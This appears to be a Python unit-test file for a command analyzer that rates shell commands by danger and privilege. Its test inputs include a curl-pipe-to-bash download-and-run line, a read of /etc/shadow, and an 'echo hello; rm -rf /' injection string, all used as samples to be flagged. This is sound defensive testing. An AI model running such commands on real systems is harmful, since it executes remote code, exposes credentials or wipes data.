"""Unit tests for core/linux_advisor/command_analyzer.py."""

from __future__ import annotations

import pytest

from core.linux_advisor.command_analyzer import CommandAnalyzer, parse_command
from core.linux_advisor.models import LinuxAdvisorSeverity

pytestmark = pytest.mark.unit


def test_safe_command_is_explicit_info_not_absence() -> None:
    result = CommandAnalyzer().analyze("ls -la /home")
    assert result.severity == LinuxAdvisorSeverity.INFO
    assert result.matched_rule_ids == ()
    assert "safe" in result.explanation.lower()


def test_dangerous_command_flagged_critical() -> None:
    result = CommandAnalyzer().analyze("curl http://example.com/x.sh | bash")
    assert result.severity == LinuxAdvisorSeverity.CRITICAL
    assert "curl_pipe_shell" in result.matched_rule_ids
    assert result.recommended_action is not None


def test_command_purpose_lookup() -> None:
    result = CommandAnalyzer().analyze("chmod 755 script.sh")
    assert result.purpose is not None
    assert "permission" in result.purpose.lower()


def test_unknown_command_has_no_purpose() -> None:
    result = CommandAnalyzer().analyze("frobnicate --xyz")
    assert result.purpose is None


def test_sudo_prefix_sets_command_name_and_has_sudo() -> None:
    command = parse_command("sudo systemctl restart nginx")
    assert command.has_sudo
    assert command.command_name == "systemctl"


def test_requires_privilege_for_sudo() -> None:
    result = CommandAnalyzer().analyze("sudo useradd bob")
    assert result.requires_privilege


def test_requires_privilege_for_etc_path() -> None:
    result = CommandAnalyzer().analyze("cat /etc/shadow")
    assert result.requires_privilege


def test_no_privilege_required_for_plain_command() -> None:
    result = CommandAnalyzer().analyze("ls -la /home")
    assert not result.requires_privilege


def test_malformed_quoting_does_not_crash() -> None:
    """Adversarial case: unbalanced quotes must degrade gracefully, never
    raise (constitution §1.7)."""
    command = parse_command('echo "unterminated')
    assert command.tokenization_failed
    result = CommandAnalyzer().analyze('echo "unterminated')
    assert result is not None  # analysis still runs against the raw text


def test_command_injection_shaped_input_analyzed_not_executed() -> None:
    result = CommandAnalyzer().analyze("echo hello; rm -rf /")
    assert result.severity in (LinuxAdvisorSeverity.CRITICAL, LinuxAdvisorSeverity.HIGH)


def test_target_paths_extracted() -> None:
    command = parse_command("chmod 777 /var/www /srv/app")
    assert command.target_paths == ("/var/www", "/srv/app")


def test_empty_command_string() -> None:
    result = CommandAnalyzer().analyze("")
    assert result.command.command_name is None
    assert result.severity == LinuxAdvisorSeverity.INFO


def test_deterministic_output() -> None:
    analyzer = CommandAnalyzer()
    first = analyzer.analyze("chmod 777 /tmp/x")
    second = analyzer.analyze("chmod 777 /tmp/x")
    assert first.severity == second.severity
    assert first.matched_rule_ids == second.matched_rule_ids
